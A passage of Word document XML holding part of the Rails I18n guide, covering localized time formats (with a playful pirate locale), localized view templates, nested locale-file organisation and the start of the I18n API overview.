        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7C481F4B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 Adding Date/Time Formats</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E57D26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">OK! Now let’s add a timestamp to the view, so we can demo the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>date/time localization</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> feature as well. To localize the time format you pass the Time object to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n.l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or (preferably) use Rails’ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>#l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper. You can pick a format by passing the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:format</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option — by default the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:default</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> format is used.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5015"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="14F544EC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7FFF1336" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># app/views/home/index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7790FAEC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;&lt;%=t :hello_world</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FF716C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;&lt;%= flash[:notice] %&gt;&lt;/p</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15310764" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;&lt;%= l Time.now, :format</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :short</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2061D10D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>And in our pirate translations file let’s add a time format (it’s already there in Rails’ defaults for English):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="397AA2CB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="639DA5DB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config/locales/pirate.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31F09D00" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>pirate:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76C3C5B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  time:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F83F616" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    formats:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14847B4B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      short: "arrrround %H'ish"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="30C42894" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>So that would give you:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70557FA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="31827A5D" wp14:editId="759D02D2">
            <wp:extent cx="3752850" cy="1771650"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="8" name="图片 8" descr="rails i18n demo localized time to pi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ils i18n demo localized time to pirate"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId552" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3752850" cy="1771650"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0EBA88" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Right now you might need to add some more date/time formats in order to make the I18n backend work as expected (at least for the ‘pirate’ locale). Of course, there’s a great chance that somebody already did all the work by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>translating Rails’ defaults for your locale</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. See the </w:t>
      </w:r>
      <w:hyperlink r:id="rId553" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>rails-i18n repository at Github</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> for an archive of various locale files. When you put such file(s) in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/locales/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory, they will automatically be ready for use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F16A1F0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 Localized Views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424F464F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails 2.3 introduces another convenient localization feature: localized views (templates). Let’s say you have a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>BooksController</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in your application. Your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> action renders content in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/books/index.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> template. When you put a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>localized variant</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of this template: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>index.es.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the same directory, Rails will render content in this template, when the locale is set to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:es</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. When the locale is set to the default locale, the generic </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> view will be used. (Future Rails versions may well bring this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>automagic</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> localization to assets in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public</w:t>
      </w:r>
      <w:r>
        <w:t>, etc.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76492188" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can make use of this feature, e.g. when working with a large amount of static content, which would be clumsy to put inside </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or Ruby dictionaries. Bear in mind, though, that any change you would like to do later to the template must be propagated to all of them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9860A1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.5 Organization of Locale Files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66BFF500" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>When you are using the default SimpleStore shipped with the i18n library, dictionaries are stored in plain-text files on the disc. Putting translations for all parts of your application in one file per locale could be hard to manage. You can store these files in a hierarchy which makes sense to you.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D26EC38" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For example, your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/locales</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory could look like this:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09411DC7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-defaults</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22201178" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|---es.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434AE895" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|---en.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC97A9D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B71B4BF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|---book</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042FE9D1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-----es.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D29B617" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-----en.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043B6EEB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771AE9AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|---defaults</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E83E73E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-----es.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054B1B5B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-----en.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D651FC4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|---books</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B807467" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-----es.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29FE50DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-----en.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C70DFAA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|---users</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31414B22" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-----es.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EC310B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-----en.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702236BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|---navigation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9A8590" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-----es.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2202D93B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>|-----en.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62545FE8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This way, you can separate model and model attribute names from text inside views, and all of this from the “defaults” (e.g. date and time formats). Other stores for the i18n library could provide different means of such separation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F03F51" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The default locale loading mechanism in Rails does not load locale files in nested dictionaries, like we have here. So, for this to work, we must explicitly tell Rails to look further:</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236D5AEC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70B9DFD0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config/application.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25CC2327" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  config.i18n.load_path += Dir[Rails.root.join('config', 'locales', '**', '*.{rb,yml}')]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3545DBB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Do check the </w:t>
      </w:r>
      <w:hyperlink r:id="rId554" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Rails i18n Wiki</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> for list of tools available for managing translations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540AB600" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4 Overview of the I18n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Features</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F4F285" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You should have good understanding of using the i18n library now, knowing all necessary aspects of internationalizing a basic Rails application. In the following chapters, we’ll cover it’s features in more depth.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0508ADF7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Covered are features like these:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39068172" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="297"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>looking up translations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A0CC67" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="297"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>interpolating data into translations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38CE6B07" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="297"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>pluralizing translations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61ECBCB0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="297"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">using safe </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> translations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520FA146" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="297"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>localizing dates, numbers, currency, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CAAE581" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 Looking up Translations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03334EFF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>4.1.1 Basic Lookup, Scopes and Nested Keys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626A4AE6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Translations are looked up by keys which can be both Symbols or Strings, so these calls are equivalent:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1920"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="569DB9A9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22C85797" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
